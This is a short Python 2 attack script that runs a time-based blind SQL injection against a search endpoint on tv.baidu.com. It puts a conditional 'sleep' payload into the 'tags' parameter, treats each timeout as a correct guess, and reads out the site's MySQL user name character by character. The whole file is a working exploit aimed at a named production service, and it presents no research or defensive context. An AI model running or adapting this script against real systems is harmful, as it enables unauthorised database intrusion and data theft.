#encoding:utf-8

import httplib
import time
import string
import sys
import urllib


headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
}

payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')
print '[%s]Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())
user = ''

for i in range(9,21):
    for payload in payloads:
        try:
            conn = httplib.HTTPConnection('tv.baidu.com', timeout=5)
            s = "if(ascii(mid(user(),%s,1))=%s,sleep(1),0)" % (i, ord(payload))
            conn.request(method='GET',
                         url='/rest/2.0/ssport/searchVideo?pageno=0&tags=' + s,
                         headers = headers)
            conn.getresponse().read()
            conn.close()
            print '.',
        except Exception, e:
            user += payload
            sys.stdout.write('\r[In progress]' + user)
            sys.stdout.flush()
            break


print '\n[Task done at %s]MySQL user is %s' % (
    time.strftime('%H:%M:%S', time.localtime()),
    user)
